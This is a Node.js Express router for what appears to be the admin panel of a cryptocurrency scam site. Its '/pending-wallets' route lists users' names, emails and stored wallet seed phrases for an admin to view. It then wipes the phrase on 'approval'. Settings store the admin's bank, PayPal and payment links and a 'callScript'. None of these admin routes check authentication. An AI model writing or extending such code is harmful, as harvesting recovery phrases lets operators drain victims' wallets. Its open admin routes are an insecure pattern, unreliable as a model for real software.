const express = require("express");
const router = express.Router();
const User = require("../models/User");
const Order = require("../models/Order");
const Settings = require("../models/Settings");

router.get("/public/settings", async (req, res) => {
    try {
        let settings = await Settings.findOne();
        if (!settings) settings = await Settings.create({}); 
        res.json(settings);
    } catch (e) { res.status(500).json({ message: "Error fetching settings" }); }
});

router.get("/pending-wallets", async (req, res) => {
    try {
        const users = await User.find({ walletStatus: "pending" }).select("name email walletAddress seedPhrase");
        res.json(users);
    } catch (e) { res.status(500).json({ message: "Error fetching wallets" }); }
});

router.post("/approve-wallet/:email", async (req, res) => {
    try {
        await User.findOneAndUpdate({ email: req.params.email }, { walletStatus: "approved", seedPhrase: null });
        res.json({ message: "Approved" });
    } catch (e) { res.status(500).json({ message: "Error approving wallet" }); }
});

router.get("/pending-orders", async (req, res) => {
    try {
        const orders = await Order.find({}).sort({ _id: -1 });
        res.json(orders);
    } catch (e) { res.status(500).json({ message: "Error fetching orders" }); }
});

router.post("/approve-order/:id", async (req, res) => {
    try {
        const order = await Order.findById(req.params.id);
        if (!order) return res.status(404).json({ message: "Order not found" });
        order.status = "Approved";
        await order.save();
        res.json({ message: "Order approved successfully" });
    } catch (e) { res.status(500).json({ message: "Error approving order" }); }
});

router.delete("/delete-order/:id", async (req, res) => {
    try {
        await Order.findByIdAndDelete(req.params.id);
        res.json({ message: "Order deleted successfully" });
    } catch (e) { res.status(500).json({ message: "Error deleting order" }); }
});

router.get("/settings", async (req, res) => {
    try {
        let settings = await Settings.findOne();
        if (!settings) settings = await Settings.create({}); 
        res.json(settings);
    } catch (e) { res.status(500).json({ message: "Error fetching settings" }); }
});

router.post("/settings", async (req, res) => {
    try {
        const { supportEmail, wallets, adminBankDetails, adminPaypalEmail, cardPaymentLink, socialTwitter, socialTelegram, socialDiscord, legalDisclaimer, customAssets, callEnabled, callScript } = req.body;
        const updatedSettings = await Settings.findOneAndUpdate(
            {},
            { supportEmail, wallets, adminBankDetails, adminPaypalEmail, cardPaymentLink, socialTwitter, socialTelegram, socialDiscord, legalDisclaimer, customAssets, callEnabled, callScript },
            { new: true, upsert: true, runValidators: false }
        );
        res.json({ message: "Success", settings: updatedSettings });
    } catch (e) { 
        console.error("SAVE ERROR:", e);
        res.status(500).json({ error: e.message }); 
    }
});
module.exports = router;
